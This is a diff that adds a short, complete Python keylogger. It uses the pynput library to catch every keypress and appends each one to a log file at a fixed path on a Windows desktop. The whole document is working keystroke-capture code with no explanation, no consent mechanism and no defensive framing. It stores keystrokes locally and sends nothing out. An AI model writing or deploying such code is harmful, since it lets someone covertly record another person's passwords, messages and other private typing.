@@ -1,0 +1,16 @@
+from pynput.keyboard import Key, Listener
+import logging
+
+log_dir = "C:\\Users\\yadagiri\\Desktop\\pythonForUse\\logsPy2.txt"
+
+logging.basicConfig(filename=(log_dir), level=logging.DEBUG, format='%(message)s')
+
+
+def on_press(key):
+    logging.info(str(key))
+
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+
